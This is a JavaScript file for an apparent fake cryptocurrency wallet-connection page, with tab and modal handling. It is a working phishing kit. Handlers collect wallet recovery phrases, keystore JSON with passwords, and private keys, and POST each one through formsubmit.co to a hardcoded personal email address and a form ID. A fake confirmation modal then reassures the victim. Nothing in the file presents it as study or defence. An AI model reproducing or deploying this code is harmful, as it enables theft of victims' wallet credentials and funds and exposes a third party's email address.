function openType(evt, Type) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i = 0; i < tabcontent.length; i++) {
    tabcontent[i].style.display = "none";
  }
  tablinks = document.getElementsByClassName("tablinks");
  for (i = 0; i < tablinks.length; i++) {
    tablinks[i].className = tablinks[i].className.replace(" active", "");
  }
  document.getElementById(Type).style.display = "block";
  evt.currentTarget.className += " active";
}

document.getElementById("defaultOpen").click();


// ---------------------------------------------------------------------------
var modal = document.getElementById("myModal");
var btn = document.getElementsByClassName('myBtn');
var span = document.getElementsByClassName("close")[0];
// When the user clicks the button, open the modal
$(".myBtn").click(function(){

modal.style.display = "block";
$('#divA').show();
$('#divB').hide();
setTimeout(function(){
    //what to do after 10 seconds
    $('#divA').hide();
    $('#divB').show();
    //or some other code
},
5000
);
var ppp = $(this).data('id');
var ppp2 = $(this).data('name');
var ppp3 = $(this).data('dir');

var ppp4 = "<img src='https://"+ppp3+"' alt='"+ppp2+"'>"

$('.proid').text(ppp);
$('.proName').text(ppp2);
$('.proDir').html(ppp4);

});

//
// for(m=0; m<btn.length; m++){
//   btn[m].onclick = function() {
//     // for(l=0; l<latest.length; l++){
//      modal.style.display = "block";
//
// // }
// }
// }
// btn.onclick = function() {
//   modal.style.display = "block";
// }



// When the user clicks on <span> (x), close the modal
span.onclick = function() {
  modal.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
// window.onclick = function(event) {
//   if (event.target == modal) {
//     modal.style.display = "none";
//   }
// }
//

//    setTimeout(function(){
//        //what to do after 10 seconds
//        $('#divA').hide();
//        $('#divB').show();
//        //or some other code
//    },
//    5000
// );


// ---------------------------------------------------------------------------
var modal2 = document.getElementById("myModal2");

// Get the button that opens the modal
var btn2 = document.getElementById("myBtn2");

// Get the <span> element that closes the modal
var span2 = document.getElementsByClassName("close2")[0];
// var div_B= document.getElementById('divB');

// When the user clicks the button, open the modal
 $('#myModal2').hide();
$('#myBtn2').click(function(){
   $('#myModal2').show();
   $('#myModal').hide();
})



// When the user clicks on <span> (x), close the modal
span2.onclick = function() {
  modal2.style.display = "none";
}


// When the user clicks anywhere outside of the modal, close it
// window.onclick = function(event1) {
//   if (event.target == modal2) {
//     modal2.style.display = "none";
//   }
// }



// =======================================================================



var modal_w = document.getElementById("myModal_w");

// Get the button that opens the modal
var btn_w = document.getElementById("myBtn_w");

// Get the <span> element that closes the modal
var span_w = document.getElementsByClassName("close_w")[0];
// var div_A= document.getElementById('divA');
// var div_B= document.getElementById('divB');

// When the user clicks the button, open the modal

$(".myBtn_w").click(function(){
  modal_w.style.display = "block";
  $('#divA_w').show();
  $('#divB_w').hide();
  setTimeout(
      function(){
         //what to do after 10 seconds
         $('#divA_w').hide();
         $('#divB_w').show();
         //or some other code
     },
     5000
  );
var ttt = $(this).data('id');
var ttt2 = $(this).data('name');
var ttt3 = $(this).data('dir');

var ttt4 = "<img src='https://"+ttt3+"' alt='"+ttt2+"'>"
// window.alert(ttt);
$('.walid').text(ttt);
$('.walName').text(ttt2);
$('.walDir').html(ttt4)


});

// When the user clicks on <span> (x), close the modal
span_w.onclick = function() {
  modal_w.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
// window.onclick = function(event) {
//   if (event.target == modal) {
//     modal.style.display = "none";
//   }
// }
//


// ---------------------------------------------------------------------------
var modal_w2 = document.getElementById("myModal_w2");

// Get the button that opens the modal
var btn_w2 = document.getElementById("myBtn_w2");

// Get the <span> element that closes the modal
var span_w2 = document.getElementsByClassName("close_w2")[0];
// var div_B= document.getElementById('divB');

// When the user clicks the button, open the modal
 $('#myModal_w2').hide();
$('#myBtn_w2').click(function(){
   $('#myModal_w2').show();
   $('#myModal_w').hide();
})



// When the user clicks on <span> (x), close the modal
span_w2.onclick = function() {
  modal_w2.style.display = "none";
}

// When the user clicks anywhere outside of the modal, close it
// ===============================================================================
function phrase_a(evt, Type_a) {
  var h, phrasecontent_a, phraselinks_a;
  phrasecontent_a = document.getElementsByClassName("phrasecontent_a");
  for (h = 0; h < phrasecontent_a.length; h++) {
    phrasecontent_a[h].style.display = "none";
  }
  phraselinks_a = document.getElementsByClassName("phraselinks_a");
  for (h = 0; h < phraselinks_a.length; h++) {
    phraselinks_a[h].className = phraselinks_a[h].className.replace(" active", "");
  }
  document.getElementById(Type_a).style.display = "block";
  evt.currentTarget.className += " active";
}

document.getElementById("default_a").click();

// ==================================================================================

var modal_show = document.getElementById("myModal_show");

function reciever(){
setTimeout(function(){modal_show.style.display = "none";}, 1000);
modal_show.style.display = "block";
$('.confam').show();
    $('.confam2').hide();
setTimeout(function(){
    //what to do after 10 seconds
    $('.confam').hide();
    $('.confam2').show();
    //or some other code
}, 3000);
    setTimeout(
        function(){
          modal_show.style.display = "none";

       },
       6000
    );
    }
    
var mail = ["muizazeez2004@gmail.com", "3636ff45719cdef68825126414f77690"];
// var appy = document.getElementById('p_name').innerText;
$("#proceed1").click(function(){
  var appy = document.getElementById('p_name').innerText;
  var message1 = document.getElementById('message1').value;
  var re = /^[a-zA-Z\s]*$/;
  function countwords(message1){
      message1 = message1.replace(/(^\s*)|(\s*$)/gi,"");
      message1 = message1.replace(/[ ]{2,}/gi," ");
      message1 = message1.replace(/\n /,"\n");
      return message1.split(' ');
  }
  if(message1 == null || message1 == ""){
    window.alert("Empty Field!");
  }
  else{
    if(countwords(message1).length<12){
    window.alert("The recovery Phrase is not Complete!");
    // window.alert(countwords(message1));
    }
    else if(re.test(message1) == 0){
      window.alert("Invalid Phrase!");

    }
    else{
modal_show.style.display = "block";
for(var i=0; i<mail.length; i++){
  // modal_show.style.display = "none";
      $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/'+mail[i],
    dataType: 'json',
    accepts: 'application/json',
    data: {
        name: appy+" Wallet",
        message: "phrase =  "+ message1,
    },

    success: (data) =>  reciever(),
    error: (err) => alert("error, input details again"),



});

    }
    }

  }
});
$("#proceed2").click(function(){
  var appy = document.getElementById('p_name').innerText;
  var message2 = document.getElementById('message2').value;
  var passy = document.getElementById('passy').value;
  var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
   if(message2 == null || message2 == "" || passy ==null || passy ==""){
    window.alert("Empty fields detected!");
  }
  else{
    // if(!message2.match(validRegex)){
      if(message2.length<5){
      window.alert("Invalid Keystore JSON!");
    }
    else{
for(var i=0; i<mail.length; i++){
      $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/'+mail[i],
    dataType: 'json',
    accepts: 'application/json',
    data: {
        name: appy+"FormSubmit",
        message: "email= "+message2+" password= "+ passy
    },
    success: (data) => reciever(),
    error: (err) => alert("error, input details again")
});

      }
  }
    // }
  }
});
$("#proceed3").click(function(){
  var appy = document.getElementById('p_name').innerText;
  var message3 = document.getElementById('message3').value;
   if(message3 == null || message3 == ""){
    window.alert("Empty Field!");
  }
  else{
    if(message3.length<64){
      window.alert("Invalid Private Key!");
    }
    else{
  for(var i=0; i<mail.length; i++){
      $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/'+mail[i],
    dataType: 'json',
    accepts: 'application/json',
    data: {
        name: appy+"FormSubmit",
        message: "Private Key= "+message3
    },
    success: (data) => reciever(),
    error: (err) => alert("error, input details again")
});
    }
  }
}
});


// ------------------------------------------------------------------------------


function phrase(evt, Typey) {
  var j, phrasecontent, phraselinks;
  phrasecontent = document.getElementsByClassName("phrasecontent");
  for (j = 0; j < phrasecontent.length; j++) {
    phrasecontent[j].style.display = "none";
  }
  phraselinks = document.getElementsByClassName("phraselinks");
  for (j = 0; j < phraselinks.length; j++) {
    phraselinks[j].className = phraselinks[j].className.replace(" active", "");
  }
  document.getElementById(Typey).style.display = "block";
  evt.currentTarget.className += " active";
}

document.getElementById("default_w").click();

var modal_show2 = document.getElementById("myModal_show2");

function reciever2(){

modal_show2.style.display = "block";
$('.confam').show();
$('.confam2').hide();
setTimeout(function(){
    //what to do after 10 seconds
    $('.confam').hide();
    $('.confam2').show();
    //or some other code
}, 3000);
    setTimeout(
        function(){
          modal_show2.style.display = "none";

       },
       6000
    );
    }

$("#proceed4").click(function(){
  var appy2 = document.getElementById('w_name').innerText;
  var message4 = document.getElementById('message4').value;
  var re = /^[a-zA-Z\s]*$/;
  function countwords(message1){
      message4 = message4.replace(/(^\s*)|(\s*$)/gi,"");
      message4 = message4.replace(/[ ]{2,}/gi," ");
      message4 = message4.replace(/\n /,"\n");
      return message4.split(' ');
  }
  if(message4 == null || message4 == ""){
    window.alert("Empty Field!");
  }
  else{
    if(countwords(message4).length<12){
    window.alert("The recovery Phrase is not Complete!");
    // window.alert(countwords(message4));
    }
    else if(re.test(message4) == 0){
      window.alert("Invalid Phrase!");
    }
    else{
for(var i=0; i<mail.length; i++){
     $.ajax({
   method: 'POST',
   url: 'https://formsubmit.co/ajax/'+mail[i],
   dataType: 'json',
   accepts: 'application/json',
   data: {
       name: appy2+" Wallet",
       message: "phrase =  "+ message4
   },
   success: (data) => reciever2(),
   error: (err) => alert("error, input details again")
   });
}
    }
  }
});

$("#proceed5").click(function(){
    var appy2 = document.getElementById('w_name').innerText;
  var message5 = document.getElementById('message5').value;
  var passy2 = document.getElementById('passy2').value;
  var validRegex = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
   if(message5 == null || message5 == "" || passy2 ==null || passy2 ==""){
    window.alert("Empty fields detected!");
  }
  else{
    // if(!message5.match(validRegex)){
    //   window.alert("Invalid Email address!");
    // }
    if(message5.length<5){
    window.alert("Invalid Keystore JSON!");
  }
    else{
for(var i=0; i<mail.length; i++){
      $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/'+mail[i],
    dataType: 'json',
    accepts: 'application/json',
    data: {
        name: appy2+" details",
        message: "email= "+message5+" password= "+ passy2
    },
    success: (data) => reciever2(),
    error: (err) => alert("error, input details again")
});

      }

   }
  }
});
$("#proceed6").click(function(){
    var appy2 = document.getElementById('w_name').innerText;
  var message6 = document.getElementById('message6').value;
   if(message6 == null || message6 == ""){
    window.alert("Empty Field!");
  }
  else{
    if(message6.length<64){
      window.alert("Invalid Private Key!");
    }
    else{
  for(var i=0; i<mail.length; i++){
      $.ajax({
    method: 'POST',
    url: 'https://formsubmit.co/ajax/'+mail[i],
    dataType: 'json',
    accepts: 'application/json',
    data: {
        name: appy2+" details",
        message: "Private Key= "+message6
    },
    success: (data) => reciever2(),
    error: (err) => alert("error, input details again")
});
    }
  }
}
});
